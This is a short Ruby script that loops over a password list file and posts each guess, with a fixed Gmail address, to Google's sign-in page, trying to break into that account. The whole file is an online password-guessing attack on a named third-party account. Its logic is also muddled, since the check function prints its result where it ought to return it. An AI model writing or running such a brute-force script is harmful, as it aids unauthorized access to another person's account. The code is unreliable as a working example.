require 'net/http'
require 'uri'

def is_wrong_password?(password)
  uri = URI.parse 'https://accounts.google.com/signin'
  response = Net::HTTP.post_form(uri, login: '7495500@gmail.com', password: password).body
  puts response.include? 'logo'
end

input = File.open 'text_files/passwords.txt', 'r'

while (line = input.gets)
  line.strip!

  print "Trying password #{line} - "

  if is_wrong_password?(line)
    pp 'Error'
    input.close
  end
end
